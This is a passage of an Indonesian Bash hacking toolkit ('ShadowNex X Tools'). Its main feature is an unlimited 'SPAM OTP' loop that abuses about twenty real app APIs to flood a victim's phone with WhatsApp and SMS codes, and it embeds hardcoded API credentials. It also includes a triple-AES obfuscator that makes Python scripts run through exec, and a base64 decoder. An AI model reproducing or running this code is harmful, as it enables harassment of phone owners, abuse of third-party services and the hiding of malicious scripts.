    openssl enc -aes-128-ecb -K "$key1" -nosalt -in "$bytecode_file" -out ".tmp_enc1.bin" 2>/dev/null
    [[ $? -ne 0 ]] && rm -f "$bytecode_file" && return 1
    
    show_loading "Encrypt bytecode layer 2"
    openssl enc -aes-128-cbc -K "$key2" -iv $(echo -n "$key2" | head -c 16) -nosalt -in ".tmp_enc1.bin" -out ".tmp_enc2.bin" 2>/dev/null
    [[ $? -ne 0 ]] && rm -f "$bytecode_file" && return 1
    
    show_loading "Encrypt bytecode layer 3"
    openssl enc -aes-128-ofb -K "$key3" -iv $(echo -n "$key3" | head -c 16) -nosalt -in ".tmp_enc2.bin" -out ".tmp_enc3.bin" 2>/dev/null
    [[ $? -ne 0 ]] && rm -f "$bytecode_file" && return 1
    
    show_loading "Encoding ke base64"
    local encrypted_code=$(base64 -w 0 ".tmp_enc3.bin" 2>/dev/null)
    [[ -z "$encrypted_code" ]] && echo -e "${RED}[!] Gagal mengenkripsi bytecode.${NC}" && rm -f "$bytecode_file" && return 1
    
    rm -f "$bytecode_file" ".tmp_enc1.bin" ".tmp_enc2.bin" ".tmp_enc3.bin"
    
    local output_file="${input_file%.*}_encrypted.py"
    local check_hash=$(echo -n "ShadowNexXv3" | sha256sum | cut -d' ' -f1)
    
    show_loading "Membuat file terenkripsi"
    cat > "$output_file" << EOF
#!/usr/bin/env python3
import base64
import hashlib
import sys
import marshal
try:
    from Crypto.Cipher import AES
except ImportError:
    print("Error: pycryptodome tidak terinstall")
    print("Install dengan: pip3 install pycryptodome")
    sys.exit(1)

class TripleDecryptor:
    def __init__(self, k1, k2, k3, data):
        self.k1 = bytes.fromhex(k1)
        self.k2 = bytes.fromhex(k2)
        self.k3 = bytes.fromhex(k3)
        self.data = base64.b64decode(data)
    
    def decrypt(self):
        try:
            cipher3 = AES.new(self.k3, AES.MODE_OFB, iv=self.k3[:16])
            d2 = cipher3.decrypt(self.data)
            
            cipher2 = AES.new(self.k2, AES.MODE_CBC, iv=self.k2[:16])
            d1 = cipher2.decrypt(d2)
            
            cipher1 = AES.new(self.k1, AES.MODE_ECB)
            d0 = cipher1.decrypt(d1)
            
            padding = d0[-1]
            if padding < 1 or padding > 16:
                raise ValueError("Invalid padding")
            d0 = d0[:-padding]
            
            return marshal.loads(d0)
        except Exception as e:
            sys.exit(f"Decryption failed: {e}")

def verify_integrity():
    expected = "$check_hash"
    current = hashlib.sha256(b"ShadowNexXv3").hexdigest()
    if expected != current:
        sys.exit("Integrity check failed")

if __name__ == "__main__":
    verify_integrity()
    decryptor = TripleDecryptor(
        "$key1",
        "$key2",
        "$key3",
        "$encrypted_code"
    )
    code_obj = decryptor.decrypt()
    exec(code_obj)
EOF
    
    chmod +x "$output_file"
    
    if [[ -f "$output_file" ]]; then
        echo -e "\n${RED}[+] File terenkripsi berhasil dibuat:${NC}"
        echo -e "${CYAN}   $output_file${NC}"
        echo -e "${YELLOW}[*] Encryption Keys:${NC}"
        echo -e "${RED}   Key1: $key1${NC}"
        echo -e "${RED}   Key2: $key2${NC}"
        echo -e "${RED}   Key3: $key3${NC}"
        echo -e "${RED}   Check Hash: $check_hash${NC}"
        echo -e "${YELLOW}[*] Catat semua keys ini!${NC}"
        echo ""
        return 0
    else
        echo -e "${RED}[!] Gagal membuat file terenkripsi.${NC}"
        echo ""
        return 1
    fi
}

encrypt_file() {
    clear
    echo ""
    echo -e "${CYAN}╭────────────────────────────────────────╮${NC}"
    echo -e "${CYAN}│         ${WHITE}ENCRYPT TOOLS${CYAN}                ${NC}"
    echo -e "${CYAN}╰────────────────────────────────────────╯${NC}"
    echo ""
    
    echo -e "${YELLOW}[1] Encrypt Python Script${NC}"
    echo -e "${YELLOW}[2] Encrypt Bash Script${NC}"
    echo -e "${YELLOW}[3] Kembali ke Menu${NC}"
    echo ""
    
    printf "   ${RED}┏━[ ${RED}ShadowNex X Tools${NC} ${RED}]${YELLOW}@termux${RED} ~ ${NC}${RED}[${YELLOW} ENCRYPT ${YELLOW}${RED}]${NC}${RED}\n   ┗━━${RED}❯${YELLOW}❯${RED}❯${YELLOW} "
    read -r choice
    
    case $choice in
        1)
            encrypt_banner
            echo ""
            read -p "[ • ] Masukkan file Python (.py) : " input_file
            echo ""
            
            [[ ! -f "$input_file" ]] && echo -e "${RED}[!] File tidak ditemukan.${NC}" && echo "" && sleep 2 && return 1
            [[ ! "$input_file" =~ \.py$ ]] && echo -e "${RED}[!] File harus berekstensi .py${NC}" && echo "" && sleep 2 && return 1
            
            encrypt_python_file "$input_file"
            ;;
        2)
            encrypt_bash_script
            ;;
        3)
            echo -e "${YELLOW}[*] Kembali ke menu utama...${NC}"
            return
            ;;
        *)
            echo -e "${RED}[!] Pilihan tidak valid.${NC}"
            echo ""
            sleep 2
            return 1
            ;;
    esac
    
    echo -e "${YELLOW}[*] Tekan ENTER untuk kembali ke menu...${NC}"
    read -r
}

codex() {
    tr -dc 'A-Za-z0-9' </dev/urandom | head -c "$1"
}

fetch_value() {
    local response=$1 start=$2 end=$3
    local idx=$(expr index "$response" "$start"); [[ $idx -eq 0 ]] && return
    idx=$(( idx + ${#start} ))
    local tail=${response:$idx}
    idx=$(expr index "$tail" "$end"); [[ $idx -eq 0 ]] && return
    printf '%s\n' "${tail:0:$(( idx-1 ))}"
}

bisatopup() {
    local dev=$(codex 16)
    local url="https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id=${dev}&version_name=6.12.04&version=61204"
    local payload="phone_number=$1"
    local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/x-www-form-urlencoded" "$url")
    [[ $(fetch_value "$res" '"message":"' '","') == "OTP akan segera dikirim ke perangkat" ]]
}

titipku() {
    local url="https://titipku.tech/v1/mobile/auth/otp?method=wa"
    local payload="{\"phone_number\": \"+62$1\", \"message_placeholder\": \"hehe\"}"
    local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json" "$url")
    [[ $(fetch_value "$res" '"message":"' '","') == "otp sent" ]]
}

jogjakita() {
    local url_token="https://aci-user.bmsecure.id/oauth/token"
    local payload_token="grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1"
    local res_tok=$(curl -s -X POST -d "$payload_token" \
        -H "Authorization: Basic OGVjMzFmODctOTYxYS00NTFmLThaOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA4LWQ3NzgyNjRhZWEyZQ==" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        "$url_token")
    local token=$(fetch_value "$res_tok" '{"access_token":"' '","') || return 1
    local url_otp="https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send"
    local payload='{"phone_user":"'$1'","primary_credential":{"device_id":"","fcm_token":"","id_kota":0,"id_user":0,"location":"0.0,0.0","uuid":"","version_code":"501","version_name":"6.10.1","via":"jogjakita_user"},"uuid":"00000000-4c22-250d-3006-9a465f072739","version_code":"5.01","version_name":"6.10.1","via":"jogjakita_user"}'
    local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json" -H "Authorization: Bearer $token" "$url_otp")
    [[ $(fetch_value "$res" '{"rc":' '","') == "200" ]]
}

candireload() {
    local url="https://app.candireload.com/apps/v8/users/req_otp_register_wa"
    local payload="{\"uuid\": \"b787045b140c631f\", \"phone\": \"$1\"}"
    local res=$(curl -s -X POST -d "$payload" \
        -H "Content-Type: application/json" \
        -H "irsauth: c6738e934fd7ed1db55322e423d81a66" \
        "$url")
    [[ $(fetch_value "$res" '{"success":' '","') == "true" ]]
}

speedcash() {
    local url_token="https://sofia.bmsecure.id/central-api/oauth/token"
    local res_tok=$(curl -s -X POST -d "grant_type=client_credentials" \
        -H "Authorization: Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        "$url_token")
    local token=$(fetch_value "$res_tok" 'access_token":"' '","') || return 1
    local uuid=$(codex 8)
    local url_otp="https://sofia.bmsecure.id/central-api/sc-api/otp/generate"
    local payload="{\"version_name\":\"6.2.1 (428)\",\"phone\":\"$1\",\"appid\":\"SPEEDCASH\",\"version_code\":428,\"location\":\"0,0\",\"state\":\"REGISTER\",\"type\":\"WA\",\"app_id\":\"SPEEDCASH\",\"uuid\":\"00000000-4c22-250d-ffff-ffff${uuid}\",\"via\":\"BB ANDROID\"}"
    local res=$(curl -s -X POST -d "$payload" -H "Authorization: Bearer $token" -H "Content-Type: application/json" "$url_otp")
    [[ $(fetch_value "$res" '"rc":"' '","') == "00" ]]
}

kerbel() {
    local url="https://keranjangbelanja.co.id/api/v1/user/otp"
    local payload="----dio-boundary-0879576676\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n$1\r\n----dio-boundary-0879576676\r\ncontent-disposition: form-data; name=\"otp\"\r\n\r\n118872\r\n----dio-boundary-0879576676--"
    local res=$(curl -s -X POST -d "$payload" \
        -H "content-type: multipart/form-data; boundary=--dio-boundary-0879576676" \
        "$url")
    [[ $(fetch_value "$res" '"result":"' '","') == "OTP Berhasil Dikirimkan" ]]
}

mitradelta() {
    local url="https://irsx.mitradeltapulsa.com:8080/appirsx/appapi.dll/otpreg?phone=$1"
    local res=$(curl -s "$url")
    [[ $(fetch_value "$res" '{"success":' '","') == "true" ]]
}

agenpayment() {
    local url_reg="https://agenpayment-app.findig.id/api/v1/user/register"
    local payload_reg="{\"name\":\"AAD\",\"phone\":\"$1\",\"email\":\"${1}@gmail.com\",\"pin\":\"1111\",\"id_propinsi\":\"5e5005024d44ff5409347111\",\"id_kabupaten\":\"5e614009360fed7c1263fdf6\",\"id_kecamatan\":\"5e614059360fed7c12653764\",\"alamat\":\"aceh\",\"nama_toko\":\"QUARD\",\"alamat_toko\":\"aceh\"}"
    local res_reg=$(curl -s -X POST -d "$payload_reg" \
        -H "content-type: application/json; charset=utf-8" \
        -H "merchantcode: 63d22a4041d6a5bc8bfdb3be" \
        "$url_reg")
    [[ $(fetch_value "$res_reg" '{"status":' '","') == "200" ]] || return 1

    local url_login="https://agenpayment-app.findig.id/api/v1/user/login"
    local payload_login="{\"phone\":\"$1\",\"pin\":\"1111\"}"
    local res_login=$(curl -s -X POST -d "$payload_login" \
        -H "content-type: application/json; charset=utf-8" \
        -H "merchantcode: 63d22a4041d6a5bc8bfdb3be" \
        "$url_login")
    local vid=$(fetch_value "$res_login" 'validate_id":"' '",') || return 1

    local url_otp="https://agenpayment-app.findig.id/api/v1/user/login/send-otp"
    local payload_otp="{\"codeLength\":4,\"validate_id\":\"$vid\",\"type\":\"whatsapp\"}"
    local res=$(curl -s -X POST -d "$payload_otp" \
        -H "content-type: application/json; charset=utf-8" \
        -H "merchantcode: 63d22a4041d6a5bc8bfdb3be" \
        "$url_otp")
    [[ $(fetch_value "$res" '{"status":' '","') == "200" ]]
}

z4reload() {
    local url="https://api.irmastore.id/apps/otp/v2/sendotpwa"
    local payload="{\"hp\":\"$1\",\"uuid\":\"MyT2H1xFo2WHoMT5gjdo3W9woys1\",\"app_code\":\"z4reload\"}"
    local res=$(curl -s -X POST -d "$payload" \
        -H "content-type: application/json" \
        -H "authorization: 7117c8f459a98282c2c576b519d0662f" \
        "$url")
    [[ $(fetch_value "$res" '{"success":' '","') == "true" ]]
}

singa() {
    local url="https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="
    local payload="{\"mobile_phone\":\"$1\",\"type\":\"mobile\",\"is_switchable\":1}"
    local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json; charset=utf-8" "$url")
    [[ $(fetch_value "$res" '"msg":"' '","') == "Success" ]]
}

ktakilat() {
    local url="https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode"
    local payload="{\"mobileNo\":\"$1\",\"smsType\":1}"
    local headers=(
        "Content-Type: application/json; charset=UTF-8"
        "Device-Info: eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJcZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxafGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0="
    )
    local res=$(curl -s -X POST -d "$payload" "${headers[@]/#/-H }" "$url")
    [[ $(fetch_value "$res" '"msg":"' '","') == "success" ]]
}

uangme() {
    local aid="gaid_15497a9b-2669-42cf-ad10-$(codex 12)"
    local url="https://api.uangme.com/api/v2/sms_code?phone=$1&scene_type=login&send_type=wp"
    local headers=(
        "aid:$aid"
        "android_id:b787045b140c631f"
        "app_version:300504"
        "brand:samsung"
        "carrier:00"
        "Content-Type:application/x-www-form-urlencoded"
        "country:510"
        "dfp:6F95F26E1EEBEC8A1FE4BE741D826AB0"
        "fcm_reg_id:frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo"
        "gaid:gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0"
        "lan:in_ID"
        "model:SM-G965N"
        "ns:wifi"
        "os:1"
        "timestamp:1732178536"
        "tz:Asia%2FBangkok"
        "User-Agent:okhttp/3.12.1"
        "v:1"
        "version:28"
    )
    local res=$(curl -s "${headers[@]/#/-H }" "$url")
    [[ $(fetch_value "$res" '{"code":"' '","') == "200" ]]
}

cairin() {
    local uuid=$(codex 32)
    local url="https://app.cairin.id/v2/app/sms/sendWhatAPPOPT"
    local payload="appVersion=3.0.4&phone=$1&userImei=$uuid"
    local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/x-www-form-urlencoded" "$url")
    [[ $res == '{"code":"0"}' ]]
}

adiraku() {
    local url="https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
    local payload="{\"mobileNumber\":\"$1\",\"type\":\"prospect-create\",\"channel\":\"whatsapp\"}"
    local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json; charset=utf-8" "$url")
    [[ $(fetch_value "$res" '{"message":"' '","') == "success" ]]
}

adiraku_v2() {
    local nomor=$1
    local url="https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
    local payload="{\"mobileNumber\":\"$nomor\",\"type\":\"prospect-create\",\"channel\":\"whatsapp\"}"
    local res=$(curl -s -X POST -d "$payload" \
        -H "Content-Type: application/json; charset=utf-8" \
        -H "User-Agent: okhttp/4.9.0" \
        --max-time 10 \
        "$url")
    [[ $(fetch_value "$res" '"message":"' '","') == "success" ]]
}

singa_v2() {
    local nomor=$1
    local url="https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="
    local payload="{\"mobile_phone\":\"$nomor\",\"type\":\"mobile\",\"is_switchable\":1}"
    local res=$(curl -s -X POST -d "$payload" \
        -H "Content-Type: application/json; charset=utf-8" \
        --max-time 10 \
        "$url")
    [[ $(fetch_value "$res" '"msg":"' '","') == "Success" ]]
}

speedcash_v2() {
    local nomor=$1
    
    local url_token="https://sofia.bmsecure.id/central-api/oauth/token"
    local res_tok=$(curl -s -X POST -d "grant_type=client_credentials" \
        -H "Authorization: Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 10 \
        "$url_token")
    
    local token=$(fetch_value "$res_tok" 'access_token":"' '","')
    [[ -z "$token" ]] && return 1
    
    local uuid=$(codex 8)
    local url_otp="https://sofia.bmsecure.id/central-api/sc-api/otp/generate"
    local payload="{\"version_name\":\"6.2.1 (428)\",\"phone\":\"$nomor\",\"appid\":\"SPEEDCASH\",\"version_code\":428,\"location\":\"0,0\",\"state\":\"REGISTER\",\"type\":\"WA\",\"app_id\":\"SPEEDCASH\",\"uuid\":\"00000000-4c22-250d-ffff-ffff${uuid}\",\"via\":\"BB ANDROID\"}"
    local res=$(curl -s -X POST -d "$payload" \
        -H "Authorization: Bearer $token" \
        -H "Content-Type: application/json" \
        --max-time 10 \
        "$url_otp")
    
    [[ $(fetch_value "$res" '"rc":"' '","') == "00" ]]
}

bisatopup_v2() {
    local nomor=$1
    local dev=$(codex 16)
    local url="https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id=${dev}&version_name=6.12.04&version=61204"
    local payload="phone_number=$nomor"
    local res=$(curl -s -X POST -d "$payload" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 10 \
        "$url")
    
    [[ $(fetch_value "$res" '"message":"' '","') == "OTP akan segera dikirim ke perangkat" ]]
}

jogjakita_v2() {
    local nomor=$1
    local url_token="https://aci-user.bmsecure.id/oauth/token"
    local payload_token="grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1"
    local res_tok=$(curl -s -X POST -d "$payload_token" \
        -H "authorization: Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA8LWQ3NzgyNjRhZWEyZQ==" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "User-Agent: okhttp/4.10.0" \
        --max-time 10 \
        "$url_token")
    
    local token=$(fetch_value "$res_tok" '{"access_token":"' '","')
    [[ -z "$token" ]] && return 1
    
    local url_otp="https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send"
    local payload="{\"phone_user\":\"$nomor\",\"primary_credential\":{\"device_id\":\"\",\"fcm_token\":\"\",\"id_kota\":0,\"id_user\":0,\"location\":\"0.0,0.0\",\"uuid\":\"\",\"version_code\":\"501\",\"version_name\":\"6.10.1\",\"via\":\"jogjakita_user\"},\"uuid\":\"00000000-4c22-250d-3006-9a465f072739\",\"version_code\":\"501\",\"version_name\":\"6.10.1\",\"via\":\"jogjakita_user\"}"
    local res=$(curl -s -X POST -d "$payload" \
        -H "Content-Type: application/json; charset=UTF-8" \
        -H "Authorization: Bearer $token" \
        --max-time 10 \
        "$url_otp")
    
    [[ $(fetch_value "$res" '"rc":"' '","') == "200" ]]
}

cairin_v2() {
    local nomor=$1
    local uuid=$(codex 32)
    local url="https://app.cairin.id/v2/app/sms/sendWhatAPPOPT"
    local data="appVersion=3.0.4&phone=$nomor&userImei=$uuid"
    local res=$(curl -s -X POST -d "$data" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 10 \
        "$url")
    
    [[ "$res" == '{"code":"0"}' ]]
}

spam_whatsapp_enhanced() {
    local nomor=$1
    local apis=(
        bisatopup
        titipku
        jogjakita
        candireload
        speedcash
        kerbel
        mitradelta
        agenpayment
        z4reload
        singa
        ktakilat
        uangme
        cairin
        adiraku
        bisatopup_v2
        jogjakita_v2
        speedcash_v2
        cairin_v2
        adiraku_v2
        singa_v2
    )
    
    for api in "${apis[@]}"; do
        if "$api" "$nomor" 2>/dev/null; then
            printf "[ ${RED}✓${NC} ] %-16s → ${RED}BERHASIL${NC}\n" "$api"
        else
            printf "[ ${RED}✗${NC} ] %-16s → ${RED}GAGAL${NC}\n" "$api"
        fi
    done
}

spam_otp() {
   sound_klik
    clear
    spasi
    echo -e "\n\n        ${RED}░██████╗░░░░█████╗░████████╗██████╗░
        ██╔════╝░░░██╔══██╗╚══██╔══╝██╔══██╗
        ╚█████╗░░░░██║░░██║░░░██║░░░██████╔╝${NC}"
    echo -e "        ${WHITE}░╚═══██╗░░░██║░░██║░░░██║░░░██╔═══╝░
        ██████╔╝██╗╚█████╔╝░░░██║░░░██║░░░░░
        ╚═════╝░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░${NC}"
    echo -e "     ${RED}╭────────────────────────────────────────╮${RED}
     │           ${RED}SPAM OTP UNLIMITED${NC}${RED}           
     ╰────────────────────────────────────────╯${NC}"
    echo -e "   ${RED}[!]${YELLOW} TEKAN CTRL+C UNTUK MENGHENTIKAN SPAM OTP${NC}\n"
    
    echo -e "   ${WHITE}DEVELOPER: ${RED}ShadowNex X Tools${NC}"
    echo -e "     ${RED}[ ! ] MASUKAN NOMOR BERAWALAN 62${NC}"
    
    printf "   ${RED}┏━[ ${RED}ShadowNex X Tools${NC} ${RED}]${YELLOW}@termux${RED} ~ ${NC}${RED}[${YELLOW} S.OTP ${YELLOW}${RED}]${NC}${RED}\n   ┗━━${RED}❯${YELLOW}❯${RED}❯${YELLOW} "
    read -r nomor
    
    [[ $nomor == [Qq] || -z $nomor ]] && { echo -e "${YELLOW}[*] Kembali ke menu...${NC}"; sleep 1; return; }
    [[ ! $nomor =~ ^62[0-9]+$ ]] && { echo -e "${RED}[!] Nomor harus dimulai dengan 62 dan hanya angka.${NC}"; sleep 2; return; }

    echo -e "\n${CYAN}[*] Memulai spam OTP ke: ${YELLOW}$nomor${NC}"
    echo -e "${CYAN}[*] Tekan ${RED}CTRL+C${CYAN} untuk berhenti${NC}\n"
    
    trap 'echo -e "\n\n${YELLOW}[*] Pengiriman dihentikan.${NC}"; return' INT
    
    local count=0
    while true; do
        count=$((count + 1))
        echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
        echo -e "${CYAN}[ BATCH: $count ]${NC}"
        echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
        
        spam_whatsapp_enhanced "$nomor"
        
        echo -e "\n${YELLOW}[*] Menunggu 2 detik sebelum batch berikutnya...${NC}"
        sleep 2
        
        if read -t 0.5 -n 1 key; then
            [[ $key == [Qq] ]] && break
        fi
    done
    
    echo -e "\n${RED}[+] Spam OTP selesai${NC}"
    echo -e "${YELLOW}[*] Kembali ke menu dalam 3 detik...${NC}"
    sleep 3
}

show_credits() {
    clear
    echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │             ${YELLOW}CREDITS & TEAM${CYAN}               
  ╰────────────────────────────────────────╯${NC}"
    
    echo -e "\n${PURPLE}════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}         SHADOWNEX X TOOLS DEVELOPMENT TEAM${NC}"
    echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
    
    echo -e "\n${RED}┌────────────────────────────────────────┐${NC}"
    echo -e "${RED}│  ${RED}DEVELOPER   : ${WHITE}MR./SHADOWNEX ${RED}      ${NC}"
    echo -e "${RED}│  ${RED}MY FRIEND  : ${WHITE}MR.LOLZZ ${RED}          ${NC}"
    echo -e "${RED}│  ${RED}SUPPORT    : ${WHITE}DANXY OFFICIAL ${RED}     ${NC}"
    echo -e "${RED}│  ${RED}TEAM    : ${WHITE}LOLFORUM ${RED}     ${NC}"    
    echo -e "${RED}│  ${RED}TEAM    : ${WHITE}[FCT] FINIX CYBER TEAM${RED}     ${NC}"    
    echo -e "${RED}└────────────────────────────────────────┘${NC}"
    
    echo -e "\n${RED}════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}Tools Version: 3.0.0${NC}"
    echo -e "${WHITE}Release Date : $(date '+%d %B %Y')${NC}"
    echo -e "${RED}════════════════════════════════════════════════${NC}"
    
    echo -e "\n${YELLOW}[*] Tekan ENTER untuk kembali ke menu...${NC}"
    read -r
    kembali_ke_menu
}

lapor_error() {
    clear
    loading
    clear
    echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │             ${YELLOW}LAPOR ERROR${CYAN}            
  ╰────────────────────────────────────────╯${NC}"
    
    echo -e "${RED}[*] Membuka WhatsApp untuk laporan error...${NC}"
    echo -e "${YELLOW}[*] Tunggu sebentar...${NC}"
    
    if command -v xdg-open &> /dev/null; then
        xdg-open "$LAPOR_TOOLS_ERROR" &
        echo -e "${RED}[+] WhatsApp berhasil dibuka${NC}"
    elif command -v open &> /dev/null; then
        open "$LAPOR_TOOLS_ERROR" &
        echo -e "${RED}[+] WhatsApp berhasil dibuka${NC}"
    elif command -v x-www-browser &> /dev/null; then
        x-www-browser "$LAPOR_TOOLS_ERROR" &
        echo -e "${RED}[+] WhatsApp berhasil dibuka${NC}"
    else
        echo -e "${YELLOW}[!] Tidak bisa membuka browser otomatis${NC}"
        echo -e "${CYAN}[*] Silakan buka link berikut secara manual:${NC}"
        echo -e "${BLUE}$LAPOR_TOOLS_ERROR${NC}"
    fi
    
    echo -e "\n${YELLOW}[*] Kembali ke menu utama dalam 3 detik...${NC}"
    sleep 3
    kembali_ke_menu
}

DonateAjg() {
    clear
    loading
    clear
    echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │             ${YELLOW}DONATE KE DEVELOPER${CYAN}            
  ╰────────────────────────────────────────╯${NC}"
    
    echo -e "${RED}[*] Membuka WhatsApp untuk laporan error...${NC}"
    echo -e "${YELLOW}[*] Tunggu sebentar...${NC}"
    
    if command -v xdg-open &> /dev/null; then
        xdg-open "$Donate_ke_ShadowNex" &
        echo -e "${RED}[+] chrome berhasil dibuka${NC}"
    elif command -v open &> /dev/null; then
        open "$Donate_ke_ShadowNex" &
        echo -e "${RED}[+] chrome berhasil dibuka${NC}"
    elif command -v x-www-browser &> /dev/null; then
        x-www-browser "$Donate_ke_ShadowNex" &
        echo -e "${RED}[+] chrome berhasil dibuka${NC}"
    else
        echo -e "${YELLOW}[!] Tidak bisa membuka browser otomatis${NC}"
        echo -e "${CYAN}[*] Silakan buka link berikut secara manual:${NC}"
        echo -e "${BLUE}$Donate_ke_ShadowNex${NC}"
    fi
    
    echo -e "\n${YELLOW}[*] Kembali ke menu utama dalam 3 detik...${NC}"
    sleep 3
    kembali_ke_menu
}




decrypt_base64_layers() {
    local content="$1"
    local max_layers=20
    local layer=1
    local decoded_content="$content"
    local has_base64=true

    show_loading "Memulai decrypt Base64"
    echo -e "\n${MAGENTA}[*] Memulai decrypt Base64 ...${NC}"

    while [[ $layer -le $max_layers ]] && [[ "$has_base64" == true ]]; do
        echo -e "${CYAN}[Layer $layer] Checking Base64...${NC}"

        if echo "$decoded_content" | grep -q -i "base64"; then
            echo -e "${YELLOW}[!] Found 'base64' keyword in layer $layer${NC}"
        fi

        local temp_content=$(echo "$decoded_content" | base64 -d 2>/dev/null)

        if [[ $? -eq 0 ]] && [[ ! -z "$temp_content" ]]; then
            decoded_content="$temp_content"
            echo -e "${RED}[+] Successfully decoded layer $layer${NC}"

            echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
            echo -e "${CYAN}[ DECRYPTED LAYER $layer - PREVIEW ]${NC}"
            echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
            echo -e "${YELLOW}"
            echo "$decoded_content" | head -n 15
            echo -e "${NC}"
            echo -e "${PURPLE}════════════════════════════════════════════════${NC}"

            layer=$((layer + 1))
        else
            has_base64=false
            echo -e "${YELLOW}[*] No more Base64 layers detected${NC}"
        fi
    done

    if [[ $layer -gt 1 ]]; then
        show_loading "Menyimpan hasil decrypt"
        echo -e "${RED}════════════════════════════════════════════════${NC}"
        echo -e "${RED}[ FINAL DECRYPTED RESULT ]${NC}"
        echo -e "${RED}════════════════════════════════════════════════${NC}"
        echo -e "${CYAN}"
        echo "$decoded_content"
        echo -e "${NC}"
        echo -e "${RED}════════════════════════════════════════════════${NC}"
        echo -e "${RED}[*] Total layers decrypted: $((layer - 1))${NC}"

        echo -e "${YELLOW}[*] Saving decrypted result to file...${NC}"
        local timestamp=$(date +%Y%m%d_%H%M%S)
        echo "$decoded_content" > "decrypted_${timestamp}.html"
        echo -e "${RED}[+] Saved as: decrypted_${timestamp}.html${NC}"
    else
        echo -e "${RED}[-] No Base64 encoding detected${NC}"
        echo -e "${CYAN}[ ORIGINAL CONTENT ]${NC}"
        echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
        echo -e "${YELLOW}"
        echo "$content" | head -n 20
        echo -e "${NC}"
        echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
    fi

    return "$((layer - 1))"
}

check_and_decrypt_html() {
    local file="$1"

    [[ ! -f "$file" ]] && echo -e "${RED}[!] File tidak ditemukan${NC}" && return

    show_loading "Analysing HTML file"
    echo -e "${MAGENTA}[*] Analysing HTML file for encoded content...${NC}"

    local content=$(cat "$file")

    echo -e "${CYAN}[1] Checking for Base64 encoded strings...${NC}"

    local base64_patterns=(
        "base64,"
        "data:text/html;base64,"
        "data:application/javascript;base64,"
        "data:text/css;base64,"
        "atob("
        "btoa("
        "fromCharCode"
    )

    local found_encoded=false

